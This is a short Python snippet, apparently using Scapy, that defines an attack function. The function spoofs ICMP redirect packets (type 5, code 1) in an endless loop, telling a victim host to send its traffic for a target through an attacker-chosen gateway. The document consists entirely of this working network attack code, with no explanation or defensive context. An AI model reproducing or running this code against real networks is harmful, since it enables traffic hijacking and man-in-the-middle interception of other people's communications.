def attack(victim, target, source, gateway):
    ip = IP(dst=victim, src=source)
    icmp = ICMP(type=5, code=1, gw=gateway)
    redirectedip = IP(dst=target, src=victim)
    while True:
        send(ip/icmp/redirectedip/UDP())
        sleep(1)